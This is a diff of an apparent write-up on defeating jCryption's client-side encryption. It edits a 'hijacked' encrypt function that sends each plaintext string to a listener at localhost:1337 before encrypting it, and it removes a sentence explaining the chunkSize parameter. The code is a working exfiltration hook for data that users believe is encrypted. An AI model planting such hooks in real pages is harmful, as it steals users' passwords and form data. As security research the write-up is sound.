@@ -75,7 +75,7 @@ If the hashes match I using the plaintext directly instead decrypt the ciphertex
 Following the hijacked javascript:
 
 ```javascript
-	$.jCryption.encrypt = function(string,keyPair,callback) { var x = new XMLHttpRequest(); x.open("GET", "http://localhost:1337/?p="+encodeURIComponent(string)+"&s="+keyPair.chunkSize, true); x.send();
+	$.jCryption.encrypt = function(string,keyPair,callback) { var x = new XMLHttpRequest(); x.open("GET", "http://localhost:1337/?p="+encodeURIComponent(string), true); x.send();
 		var charSum = 0;
 		for(var i = 0; i < string.length; i++){
 			charSum += string.charCodeAt(i);
@@ -101,7 +101,6 @@ Following the hijacked javascript:
 		function encryption(encryptObject) {
 [...]
 ```
-The 's' parameter, sent along with the plaintext to "localhost:1337" is the "chunkSize", used for split the plaintext in "chunks".
 <br>
 The encrypted data will have the following format:
 <br>
